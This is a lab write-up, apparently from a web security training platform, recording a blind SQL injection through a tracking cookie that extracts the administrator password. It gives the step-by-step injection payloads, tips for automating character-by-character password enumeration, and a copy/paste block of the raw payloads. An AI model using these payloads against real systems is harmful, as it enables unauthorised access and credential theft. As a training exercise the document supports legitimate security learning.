# Blind SQL injection with conditional responses

A concise write-up using **my original steps** (verbatim flow) with small, accurate notes.  
**Note:** Payloads are shown exactly as used (no URL-encoding).

---

## 🥅 Goal
**Get the administrator password and log in** using a boolean-based signal from a cookie.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: Get the administrator password and log in**

2. **lab informs that we have "username,password" columns in "users" table**

3. **i have not payed attention to the other details, so you'll see how i figured it out**

4. **i tried to find the vulnerable param but everything look good until i realised, it was the cookie:**

5. **`TrackingId=ZzzPCSZEwOvDr9vB;` returns Content length of "5,501" while `TrackingId=ZzzPCSZEwOvDr9vB';` returns CL of "5,440"**

6. **When i looked back what missing i took text comparer (see picture), discovering a tag containing: "Welcome back!" is missing, Note: you could read it from lab description. but that's how you'd do it in more realistic environment**

7. **how many columns returning? -> `TrackingId=ZzzPCSZEwOvDr9vB'+UNION+SELECT+null+--+;` -> only one!**

8. **Trying to reflect i got nothing, lets try the knowledge the lab provided to us:**

9. **`'+UNION+SELECT+username+FROM+users+WHERE+username='administrator'+--+;` -> gets the "Welcome back" string (our flag)**

10. **This means it boolean based, if have an "informer" telling us when what we request actually exists in on the page.**

11. **Logically we would enumerate password, but it will take too long.**

12. **We can try guessing each letter or a symbol at a time, since it's a lab, its probably just letters and numbers lets start with that.**

13. **Lets figure out how to do boolean in sql, and take the first letter (see pictures).**

14. **`'+UNION+SELECT+CASE+WHEN+(SUBSTRING(password,1,1)='1')+THEN+username+ELSE+username+END+FROM+users+WHERE+username='administrator'+--+;`**

15. **This is pointless but we can see we get "Welcome back", if we change this**

16. **`'+UNION+SELECT+CASE+WHEN+(SUBSTRING(password,1,1)='1')+THEN+a+ELSE+username+END+FROM+users+WHERE+username='administrator'+--+;`**

17. **as long as the password does not start with 1, we wont get the "Welcome back" String anymore.**

18. **Now we need to find a way to automate this, we could use burp, but its very slow.**

19. **i will use python, see automation.py file!**

20. **`'+UNION+SELECT+null+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,1,1)='c'+--+;`**

21. **This was true, changing to 'b' also gave me true. i had to find a different way.**

22. **after a long research i found out the lab wont trigger by UNION, since UNION always returning something, then i had to make the query fail in a condition!**

23. **i started all over again, from the basics: `ZzzPCSZEwOvDr9vB'+AND+1=1+--+` -> this gave me true**

24. **`ZzzPCSZEwOvDr9vB'+AND+1=2+--+` this gave me false. Okay...**

25. **`'+AND+(SELECT 1)=1+--+` -> this is also true. you can see where im going..**

26. **after a while of randomly playing i found out this:**

27. **`ZzzPCSZEwOvDr9vB'+AND+(SELECT SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')!='r'+--+` which return true, changing r will result in false!**

28. **Now i rebuild the python file!**

29. **Get password and log in**

30. **Lab solved!**

---

## 🧠 Minimal Additions (Why / Tips)

- **Why UNION stalled for boolean tests:** `UNION SELECT ...` tends to **produce a row** regardless of predicate truthiness, so your page’s presence/absence signal (“Welcome back!”) isn’t a reliable boolean oracle with UNION. Switching to **inline boolean predicates** (`...'+AND+<condition>+--+`) on the original query lets the page state flip between true/false.
- **Content-Length as oracle:** Tracking **Content-Length** (and diffing HTML) is a classic way to detect boolean changes when there’s no explicit error. Your diff confirming the **missing "Welcome back!"** is spot on.
- **Trailing comment space:** Many parsers require whitespace after `--`. Your `--+` works because `+` is treated as a space in this context or otherwise neutral. Keep it consistent with the lab’s behavior.
- **Enumeration strategy:** Build a loop over an **alphabet** (e.g., `0123456789abcdefghijklmnopqrstuvwxyz`) and position index `i` in `SUBSTRING(password,i,1)`. Flip the condition per character until the page signals **true**, then append and increment `i`.
- **DB flavor:** If this were **MySQL**, `SUBSTRING` is fine. If **Oracle**, use `SUBSTR(...)`; for **SQL Server**, use `SUBSTRING` as well. The lab here accepts `SUBSTRING` as used.

---

## 🔧 Raw Payloads I Used (Copy/Paste)

```text
TrackingId=ZzzPCSZEwOvDr9vB;
TrackingId=ZzzPCSZEwOvDr9vB';
TrackingId=ZzzPCSZEwOvDr9vB'+UNION+SELECT+null+--+;

'+UNION+SELECT+username+FROM+users+WHERE+username='administrator'+--+;
'+UNION+SELECT+CASE+WHEN+(SUBSTRING(password,1,1)='1')+THEN+username+ELSE+username+END+FROM+users+WHERE+username='administrator'+--+;
'+UNION+SELECT+CASE+WHEN+(SUBSTRING(password,1,1)='1')+THEN+a+ELSE+username+END+FROM+users+WHERE+username='administrator'+--+;
'+UNION+SELECT+null+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,1,1)='c'+--+;

ZzzPCSZEwOvDr9vB'+AND+1=1+--+
ZzzPCSZEwOvDr9vB'+AND+1=2+--+
'+AND+(SELECT 1)=1+--+
ZzzPCSZEwOvDr9vB'+AND+(SELECT SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')!='r'+--+
```

---

## 🏁 Result
- Identified a **cookie-based boolean oracle**, switched from UNION attempts to inline boolean predicates, automated the character search, **recovered the admin password**, and logged in. **Lab Solved. ✅**
